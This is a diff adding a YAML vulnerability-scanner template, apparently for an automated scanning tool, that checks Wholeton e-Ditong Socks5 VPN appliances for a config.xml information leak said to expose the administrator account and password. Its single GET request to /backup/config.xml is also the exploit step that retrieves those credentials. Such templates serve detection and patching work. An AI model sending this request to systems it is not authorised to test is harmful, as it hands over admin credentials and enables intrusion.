@@ -1,0 +1,19 @@
+id: wholeton-vpn-info-leak
+
+info:
+  name: 惠尔顿 e地通 config.xml 信息泄漏漏洞
+  author: zan8in
+  severity: high
+  description: |
+    惠尔顿 e地通Socks5 VPN登录系统 存在信息泄漏漏洞，访问特殊的Url即可获取管理员账号密码
+    app="惠尔顿-e地通VPN"
+  reference:
+    - http://wiki.peiqi.tech/wiki/iot/%E6%83%A0%E5%B0%94%E9%A1%BF/%E6%83%A0%E5%B0%94%E9%A1%BF%20e%E5%9C%B0%E9%80%9A%20config.xml%20%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.html
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /backup/config.xml
+    expression: response.status == 200 && response.body.bcontains(b'administrator') && response.body.bcontains(b'virtualadapter')
+expression: r0()
